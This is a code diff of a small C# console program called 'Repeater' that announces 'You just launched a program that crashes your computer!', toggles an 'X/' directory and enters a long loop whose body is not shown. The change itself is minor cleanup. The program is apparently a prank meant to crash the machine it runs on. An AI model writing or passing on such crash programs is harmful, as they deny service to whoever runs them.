@@ -7,25 +7,22 @@ namespace Repeater
 {
     public static class Repeat
     {
-        public const string InternalVersion = "1.1.0";
-        private static ulong x = ulong.MinValue;
-        private static readonly string XDir = "X/",
+        public const string InternalVersion = "1.1.1";
+        static ulong x = ulong.MinValue;
+        static readonly string XDir = "X/",
             Prgm = Assembly.GetExecutingAssembly().GetName().Name,
             Message = "You just launched a program that crashes your computer!";
-        public static void Main(string[] _)
+        public static void Main()
         {
             Console.Title = "Repeater (XDir) v" + InternalVersion;
             Console.ForegroundColor = ConsoleColor.DarkYellow;
             Console.BackgroundColor = ConsoleColor.DarkRed;
             Console.Out.WriteLine(Message);
+            Console.Out.Flush();
             if (Directory.Exists(XDir))
-            {
                 Directory.Delete(XDir);
-            }
             else
-            {
                 Directory.CreateDirectory(XDir);
-            }
             Thread.Sleep(100);
             while (x != ulong.MaxValue)
             {
